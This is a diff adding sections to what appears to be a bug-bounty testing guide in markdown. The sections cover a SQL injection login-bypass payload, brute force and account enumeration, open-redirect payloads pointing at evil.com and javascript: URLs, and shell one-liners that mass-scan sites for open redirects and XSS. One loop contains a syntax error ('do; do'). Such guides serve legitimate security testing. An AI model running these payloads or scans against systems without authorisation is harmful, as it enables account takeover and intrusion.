@@ -307,3 +307,116 @@
 * The email verification is successfully bypassed.
 * The attacker can now log in using the victim's account, bypassing the verification methods.
 * **Reference**: [HackerOne Report 1074047](https://hackerone.com/reports/1074047).
+
+## LOGIN PAGE VULNERABILITIES 
+**1. SQL Injection - Authentication Bypass**
+- Navigate to the login page of the application.
+- In either the username or password field, enter the following payload:
+     ```
+     admin' OR '1'='1'#
+     ```
+- After entering the payload, click the **Submit** button.
+- If the login page is vulnerable, you should be logged in successfully as an admin.
+- The payload used for the authentication bypass is: 
+## Resources:
+- [Payload List (Auth Bypass)](https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt)
+- [Web Application Wordlist](https://github.com/p0dalirius/webapp-wordlists/tree/main)
+
+**2. Brute Force Attack **
+- Go to the login page of the application.
+- Use a tool like Hydra or Burp Suite's Intruder to automate login attempts with common password lists.
+- Monitor the login attempts to see if the application allows multiple attempts without rate-limiting or blocking.
+- Check for successful login attempts with weak passwords.
+- Confirm if the application is vulnerable to brute force attacks due to lack of protection mechanisms.
+
+**3. Account Enumeration and Login Error Messages**
+- Go to the login page.
+- Try logging in with a valid username and incorrect password.
+- Then, try logging in with an invalid username and incorrect password.
+- Observe the error messages. If they differ, the application may be vulnerable to account enumeration.
+
+## OPEN REDIRECTION VULNERABILITY
+**1. First Method**
+* Go to `https://www.private.com`.
+* Capture the request in Burp Suite.
+* Send this request to the Intruder tab in Burp Suite.
+* Set the payload after the domain directly. For example: `private.com/$test$`.
+* Replace `$test$` with your open redirect payloads.
+* Add all open redirect payloads in the Intruder.
+* Click on **Start Attack** and check for a `301` response.
+* Payloads link: [Open Redirection Payloads - Medium](https://medium.com/@cyb3rD1vvya/open-redirection-b6c2505f1f44).
+
+**2. Second Method**
+- If the application has a user Sign-In/Sign-Up feature, register a user and log in as that user.
+- Go to your user profile page (e.g., `samplesite.me/accounts/profile`).
+- Copy the profile page's URL. Log out and clear all cookies, then go to the homepage of the site.
+- Paste the copied profile URL into the address bar.
+- If the site prompts for a login, check the address bar for a login page with a redirect parameter like:
+  - `https://samplesite.me/login?next=accounts/profile`
+  - `https://samplesite.me/login?retUrl=accounts/profile`
+- Try exploiting the parameter by adding an external domain and loading the crafted URL, e.g.:
+  - `https://samplesite.me/login?next=https://evil.com/`
+  - `https://samplesite.me/login?next=https://samplesite.me@evil.com/` (to bypass a bad regex filter).
+- If it redirects to `evil.com`, this confirms an open redirection bug.
+- To further test, try to leverage it for XSS. For example: - `https://samplesite.me/login?next=javascript:alert(1);//`
+
+**3. Open Redirect to XSS**
+- Open your browser and go to the login page: `https://example.com/login`.
+- In the address bar, modify the URL to include the redirect parameter with the payload: 
+  - `https://example.com/login?redirect=http://;@google.com`
+- Press Enter and observe if you are redirected to `http://google.com`.
+- If you are successfully redirected to `http://google.com`, it confirms the open redirection vulnerability.
+- Change the redirect URL to test for XSS. For example:
+  - `https://example.com/login?redirect=javascript:alert(1)`
+- Press Enter to navigate to this URL.
+- If the application is vulnerable, after logging in, the JavaScript payload will execute, resulting in an alert pop-up displaying `1`.
+- Payloads repository: [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect).
+
+**4. Automation Methoads to Find Open Redirection Vulnerabilities**
+- Run the following command to find open redirection vulnerabilities:
+```bash
+waybackurls vulnweb.com | grep -a -i =http | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I | grep "evil.com" && echo "$host \033[0;31mVulnerable\n"; done
+```
+```
+subfinder -d target.com | httprobe |tee live_domain.txt; cat live_domain.txt | waybackurls | tee wayback.txt; cat wayback.txt | sort -u | grep "\?" > open.txt; nuclei -t ~/nuclei-templates/dast/vulnerabilities/redirect/open-redirect.yaml -l open.txt
+```
+
+## Testing Cross Site Scripting (XSS) Vulnerability in Automation
+1. Using waybackurls and curl to Test for XSS
+```bash
+waybackurls testphp.vulnweb.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done
+```
+2. Using gospider and dalfox for Automated XSS Testing
+```
+gospider -S live_subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee Xss_Result.txt
+```
+**3. Using waybackurls and gf to Find XSS Payloads**
+```
+waybackurls http://example.com | gf xss | sed 's/=.*/=/' | sort -u | tee XSS.txt && cat XSS.txt | dalfox file XSS.txt
+```
+**4. Using waybackurls, qsreplace, and freq for XSS Testing**
+```
+echo target | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
+```
+**5. Using waybackurls, gf, and dalfox for XSS Detection**
+```
+cat targets | waybackurls | anew | grep "=" | gf xss | nilo | gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
+```
+**6. Using waybackurls, bhedak, and airixss for XSS Testing**
+```
+waybackurls testphp.vulnweb.com | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+**7. Using waybackurls and freq for XSS Payload Injection**
+```
+echo testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
+```
+**8. Using httpx, hakrawler, and dalfox for XSS Testing**
+```
+echo testphp.vulnweb.com | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
+```
+
+
+
+
+
+
